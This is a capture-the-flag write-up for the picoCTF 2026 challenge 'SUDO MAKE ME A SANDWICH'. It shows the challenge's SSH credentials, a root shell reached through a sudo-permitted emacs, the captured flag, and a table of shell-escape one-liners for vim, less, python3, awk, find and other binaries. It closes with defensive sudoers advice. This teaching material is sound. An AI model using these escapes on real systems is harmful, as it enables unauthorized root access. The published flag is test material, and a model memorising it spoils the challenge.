# 🥪 SUDO MAKE ME A SANDWICH

| Field | Details |
|-------|---------|
| **CTF** | picoCTF 2026 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Points** | 50 pts |
| **Author** | DARKRAICG492 |
| **Technique** | Sudo Privilege Escalation via Editor Shell Escape |

---

## 🧩 Challenge Description

> *Can you read the flag? I think you can!*

We are given SSH access to a remote machine:

```
ssh -p 60702 ctf-player@green-hill.picoctf.net
Password: 8b23dc85
```

A `flag.txt` file exists on the system but is owned by root and not readable by the `ctf-player` user. The goal is to leverage **misconfigured sudo permissions** to escalate privileges and read the flag.

> 💡 The challenge name is a reference to [xkcd #149](https://xkcd.com/149/) — a sandwich is only made after the magic word **sudo** is invoked. Here, we do exactly that.

---

## 🔍 Reconnaissance

### Step 1 — SSH Into the Instance

```bash
ssh -p 60702 ctf-player@green-hill.picoctf.net
# Password: 8b23dc85
```

---

### Step 2 — Attempt to Read the Flag

Once connected, `flag.txt` is visible in the home directory. Try reading it:

```bash
ctf-player@challenge:~$ ls
flag.txt

ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

❌ **Permission denied** — the file is owned by root. We need to find another way.

---

### Step 3 — Enumerate Sudo Permissions

Check what commands the current user can run with elevated privileges:

```bash
ctf-player@challenge:~$ sudo -l
```

**Output:**
```
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

> ⚠️ **Critical Finding:** The user can run `/bin/emacs` as **any user (including root)** with **no password required**. Emacs is a full-featured editor capable of executing shell commands — this is an instant privilege escalation vector.

---

## 💥 Exploitation

### Step 4 — Launch Emacs as Root

```bash
ctf-player@challenge:~$ sudo /bin/emacs
```

GNU Emacs opens. Since it was launched via `sudo`, the entire Emacs process is running **as root** — meaning any shell it spawns will also be a root shell.

---

### Step 5 — Escape to a Root Shell via Emacs

Inside Emacs, use the built-in shell mode:

1. Press **`Alt + X`** (written as `M-x` in Emacs notation)
   - On some systems: press `Esc`, then `X`
2. Type **`shell`** and press **`Enter`**

This opens an interactive shell buffer inside Emacs — running as **root**.

> 💡 Alternatively, `M-x eshell` also works and opens Emacs' built-in Eshell.

---

### Step 6 — Read the Flag

Inside the Emacs root shell, run:

```bash
cat flag.txt
```

**Output:**
```
picoCTF{ju57_5ud0_17_9a782247}
```

---

## 🚩 Flag

```
picoCTF{ju57_5ud0_17_9a782247}
```

---

## 📚 Concepts & Further Reading

### Why Does This Work?

Text editors like `emacs`, `vim`, and `nano` are **general-purpose execution environments** — they can run shell commands, execute scripts, and spawn subprocesses. Granting unrestricted `sudo` access to any of these is functionally equivalent to giving full root shell access.

### Other Commonly Abused Binaries (GTFOBins)

This technique isn't limited to emacs. Any of these, if granted sudo access, can be abused the same way:

| Binary | Shell Escape Method |
|--------|-------------------|
| `vim` / `vi` | `:!bash` or `:shell` |
| `nano` | `Ctrl+R` → `Ctrl+X` → `reset` |
| `less` | `!bash` from the pager prompt |
| `man` | `!bash` from the viewer |
| `python3` | `import os; os.system('/bin/sh')` |
| `perl` | `exec '/bin/sh'` |
| `awk` | `BEGIN {system("/bin/sh")}` |
| `find` | `-exec /bin/sh \;` |

> 🔗 Reference: [GTFOBins — emacs](https://gtfobins.github.io/gtfobins/emacs/) | [GTFOBins — full list](https://gtfobins.github.io/)

---

## 🛡️ Defensive Perspective

- Always apply the **principle of least privilege** — users should only have sudo access to the minimum set of commands they truly need.
- **Never grant sudo access to editors, interpreters, or tools** capable of spawning arbitrary processes.
- Audit `/etc/sudoers` regularly and use `sudo -l` as an attacker would — to find misconfigurations before they're exploited.

---

## 🗺️ Attack Summary

```
SSH into machine
       ↓
cat flag.txt → Permission Denied
       ↓
sudo -l → (ALL) NOPASSWD: /bin/emacs   ← misconfiguration found
       ↓
sudo /bin/emacs
       ↓
M-x shell → root shell inside emacs
       ↓
cat flag.txt → picoCTF{ju57_5ud0_17_9a782247}
```

---

> **Key lesson:** `sudo -l` should be one of the **first commands** you run after getting access to any Linux machine in a CTF. Misconfigured sudo permissions are one of the most common and immediately exploitable privilege escalation vectors.
